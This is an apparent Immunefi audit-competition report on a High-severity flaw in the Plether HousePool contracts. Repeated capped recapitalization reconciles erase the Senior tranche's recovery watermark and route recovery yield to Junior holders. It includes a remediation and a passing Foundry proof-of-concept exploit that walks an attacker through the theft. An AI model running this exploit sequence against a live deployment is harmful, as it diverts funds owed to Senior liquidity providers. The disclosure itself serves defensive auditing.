# \#97844 [SC-High] Repeated capped recapitalization erases Senior's recovery watermark

**Submitted on Nov 3rd 2026 at 14:29:09 UTC by @TaiChi_Audit_Group for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97844
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary
When only part of a pending recapitalization is backed by current physical equity, repeating reconciliation without any economic state change overwrites the Senior high-water mark with the residual pending amount. Future recovery value can consequently bypass existing Senior LPs and accrue to Junior LPs.

## Description
`HousePool` caps pending claimant buckets to the current terminal distributable equity, reserves that capped amount from the ordinary waterfall, and then applies it after the waterfall reconcile. The settled portion is removed from `pendingRecapitalizationAssets`, so the next pass supplies only the residual bucket as the recapitalization target ([src/HousePool.sol:1562-1598](src/HousePool.sol:1562-1598)).

This becomes non-idempotent when a raw cash shortfall leaves only part of a recapitalization settleable. On the first pass, an empty-but-seeded Senior tranche is assigned the settleable amount and its high-water mark is correctly set to the full pending recapitalization intent. On an unchanged second pass, the residual pending amount is again subtracted from the same physical distributable equity. That makes the already-assigned Senior principal appear unsupported, so the ordinary loss waterfall reduces it back to zero. `applyClaimantRecapitalizationIntent()` then enters its empty-waterfall branch again, but now `recapitalizationTargetAssets` is only the residual pending balance and it unconditionally replaces the high-water mark ([src/libraries/HousePoolPendingPreviewLib.sol:103-135](src/libraries/HousePoolPendingPreviewLib.sol:103-135)):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

For example, after a full tranche wipe, governance can contribute 100 units of recapitalization and a raw custody shortfall can leave only 50 units physically available. The first reconcile produces `seniorPrincipal = 50`, `seniorHighWaterMark = 100`, and `pendingRecapitalization = 50`. With no balance, liability, or price change, the second reconcile first removes the 50-unit pending reserve from the 50-unit distributable base, absorbs the resulting apparent 50-unit loss from Senior, and then reapplies the residual recapitalization. The final state is `seniorPrincipal = 50`, `seniorHighWaterMark = 50`, and no pending recapitalization. Half of the intended recovery priority has disappeared even though the second call introduced no loss.

Reconciliation can be reached through the permissionless LP epoch settlement path ([src/HousePool.sol:794-835](src/HousePool.sol:794-835)). A Junior LP can arrange multiple matured, zero-value Junior redemption epochs while Junior principal is wiped; each epoch is refundable but counts as settlement progress, allowing the attacker to retain their shares while forcing the repeated reconciles. Once cash recovers through ordinary trading revenue, the erased Senior gap no longer exists, so the recovered value is credited to Junior instead of restoring Senior.

## Impact Severity

**High**

The final impact is theft of unclaimed yield. After acquiring economically worthless wiped Junior shares, an unprivileged attacker erases Senior's recovery priority and withdraws subsequent ordinary trading revenue that the documented waterfall assigns to Senior. The attacker receives USDG at the direct expense of Senior LPs, matching the competition's High-severity impact exactly.

## Why This Is Valid and Not a Known Issue

This is an in-scope, permissionless, launch-active failure in `HousePoolPendingPreviewLib` and `HousePool`: refundable zero-value redemption epochs satisfy the settlement progress guard, allowing repeated reconciliation to replace the original recapitalization target with its shrinking residual while the attacker retains transferable Junior shares. Governance performs only the documented `clearDegradedMode()` and `recapitalizePool()` recovery actions, and the opposing-position limitation used to construct the recovery state is not the reported bug. The root cause is distinct from `MED-11`, `MED-12`, and `MED-24`, which respectively concern funded-redemption watermark scaling, mixed inflow routing, and epoch work-cap consumption; none covers non-idempotent replacement of the Senior recovery target across successive reconciliations.

## Remediation

Persist the full recapitalization recovery target separately from the residual pending amount. Partial settlement should reduce only the unsettled cash bucket; every pass belonging to that recapitalization batch must use the original target, and an unchanged reconcile must not reduce an already-established target. Because a fresh recapitalization after a complete wipe intentionally replaces a stale pre-wipe HWM, use an explicit batch/target field rather than simply taking `max(oldHwm, residual)` in all cases.

## Proof of Concept

The inline test passed on the pinned commit with Forge 1.5.1. Its setup uses public Router orders to reach the documented opposing-position recovery state; the reported root begins afterward. A fresh attacker acquires the already-wiped Junior shares at zero NAV, honest governance recapitalizes, two public settlement passes erase the watermark, and later trading revenue is paid to the attacker.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../perps/shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

contract CappedRecapWatermarkPoC is HousePoolTestBase {
    address constant ATTACKER = address(0xBAD);
    address constant KEEPER = address(0xB0B0);
    address constant RECOVERY_TRADER = address(0xBEEF);

    function test_PoC_RepeatedRecapSettlementStealsSeniorRecovery() public {
        _fundSenior(alice, 100_000e6);
        _fundJunior(bob, 100_000e6);
        _finishAsyncCooldown(juniorVault, bob);

        address longWinner = address(0xA110);
        address shortWinner = address(0xA220);
        uint256 opposingSize = 200_000e18;
        _fundTrader(longWinner, 10_000e6);
        _fundTrader(shortWinner, 10_000e6);
        _trade(longWinner, CfdTypes.Side.LONG, opposingSize, 5000e6, 1e8, false);
        _trade(shortWinner, CfdTypes.Side.SHORT, opposingSize, 5000e6, 1e8, false);
        _trade(longWinner, CfdTypes.Side.LONG, opposingSize, 0, 1e6, true);
        _trade(shortWinner, CfdTypes.Side.SHORT, opposingSize, 0, 2e8, true);

        uint256 claim = engine.traderClaimBalanceAssets(shortWinner);
        assertGt(claim, 0);
        assertTrue(engine.degradedMode());
        engine.clearDegradedMode();

        uint256 juniorShares = juniorVault.balanceOf(bob);
        uint256 wipeEpoch = _requestAsyncRedeem(juniorVault, bob, juniorShares);
        _settle(wipeEpoch);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        _refund(wipeEpoch, bob, juniorShares);

        // Transfer the zero-NAV shares to a fresh attacker.
        _finishAsyncCooldown(juniorVault, bob);
        vm.prank(bob);
        juniorVault.transfer(ATTACKER, juniorShares);

        uint256 rawBefore = pool.rawAssets();
        uint256 recap = 2 * (claim - rawBefore);
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);

        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 firstEpoch = _requestAsyncRedeem(juniorVault, ATTACKER, juniorShares);
        _settle(firstEpoch);
        uint256 backedHalf = recap / 2;
        assertApproxEqAbs(pool.seniorPrincipal(), backedHalf, 1);
        assertEq(pool.seniorHighWaterMark(), recap);
        _refund(firstEpoch, ATTACKER, juniorShares);

        // No balance, mark or liability input changes between these passes.
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 secondEpoch = _requestAsyncRedeem(juniorVault, ATTACKER, juniorShares);
        _settle(secondEpoch);
        assertApproxEqAbs(pool.seniorPrincipal(), backedHalf, 1);
        assertApproxEqAbs(pool.seniorHighWaterMark(), backedHalf, 1);
        _refund(secondEpoch, ATTACKER, juniorShares);

        vm.prank(shortWinner);
        engine.settleTraderClaim(shortWinner);

        // Ordinary trading revenue should restore the erased Senior gap. Instead,
        // the corrupted HWM routes it to Junior and funds the attacker.
        _fundTrader(RECOVERY_TRADER, 5000e6);
        _trade(RECOVERY_TRADER, CfdTypes.Side.LONG, 10_000e18, 2000e6, 1e8, false);
        _trade(RECOVERY_TRADER, CfdTypes.Side.LONG, 10_000e18, 0, 1.2e8, true);

        uint256 seniorBefore = pool.seniorPrincipal();
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 recoveryEpoch = _requestAsyncRedeem(juniorVault, ATTACKER, juniorShares);
        _settle(recoveryEpoch);
        assertEq(pool.seniorPrincipal(), seniorBefore);

        uint256 fundedShares = juniorVault.claimableRedeemRequest(recoveryEpoch, ATTACKER);
        uint256 payout = juniorVault.claimableRedeemAssets(recoveryEpoch, ATTACKER);
        assertGt(payout, 0);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(recoveryEpoch, fundedShares, ATTACKER, ATTACKER);
        assertEq(settlementToken.balanceOf(ATTACKER), payout);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool close
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, close);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settle(uint256 epoch) internal {
        vm.warp(pool.lpEpochStart(epoch));
        _refreshMarkForAsyncSettlement();
        pool.settleLpEpoch(0, 0);
    }

    function _refund(uint256 epoch, address owner, uint256 shares) internal {
        assertEq(juniorVault.refundableRedeemRequest(epoch, owner), shares);
        vm.prank(owner);
        assertEq(juniorVault.claimRedeemRefund(epoch, owner, owner), shares);
    }
}
```

### Run Command

Temporarily save the Solidity block as `test/poc/THCappedRecap.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/poc/THCappedRecap.t.sol -vv
```

### Verified Output

```text
[PASS] test_PoC_RepeatedRecapSettlementStealsSeniorRecovery() (gas: 15037244)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```
